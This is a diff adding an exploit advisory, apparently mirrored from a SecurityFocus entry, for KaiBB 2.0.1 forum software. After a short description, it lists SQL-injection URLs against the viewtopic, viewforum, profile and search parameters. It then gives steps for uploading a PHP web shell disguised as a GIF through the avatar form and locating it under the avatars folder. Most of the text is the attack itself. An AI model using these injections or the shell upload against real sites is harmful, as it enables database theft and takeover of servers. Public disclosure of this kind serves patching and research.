@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/49421/info
+
+KaiBB is prone to multiple SQL-injection vulnerabilities and a arbitrary-file-upload vulnerability because it fails to sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to compromise the application, execute arbitrary code, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+KaiBB 2.0.1 is vulnerable; other versions may also be affected. 
+
+<+> 1 / * Multiple SQL Inj3cti0n :
+
+http://127.0.0.1/kaibb/?s=viewtopic&t='
+http://127.0.0.1/kaibb/?s=viewtopic&t=1'
+http://[target]/[path]/?s=viewtopic&t=[SQLi]
+------------------------------------------------
+http://127.0.0.1/kaibb/?s=viewforum&f='
+http://127.0.0.1/kaibb/?s=viewforum&f=1'
+http://[target]/[path]/?s=viewforum&f=[SQLi]
+------------------------------------------------
+http://127.0.0.1/kaibb/?s=profile&user='
+http://127.0.0.1/kaibb/?s=profile&user=2'
+http://[target]/[path]/?s=profile&user=[SQLi]
+------------------------------------------------
+http://127.0.0.1/kaibb/?s=search&mode=search&term=&page='
+http://127.0.0.1/kaibb/?s=search&mode=search&term=&page=1'
+http://[target]/[path]/?s=search&mode=search&term=&page=1'[SQLi]
+------------------------------------------------
+
+<+> 2 / * File|Sh3lL Upload :  
+
+http://127.0.0.1/kaibb/?s=ucp&mode=avatar
+
++ After register go t0 : 
+http://[target]/[path]/?s=ucp&mode=avatar
++ Upload Sh3ll.php.gif ....
+- Find him on : http://127.0.0.1/kaibb/img/avatars/{UserID}.gif
+fr0m eXample : {UserID} = 2 :
++ http://127.0.0.1/kaibb/img/avatars/2.gif
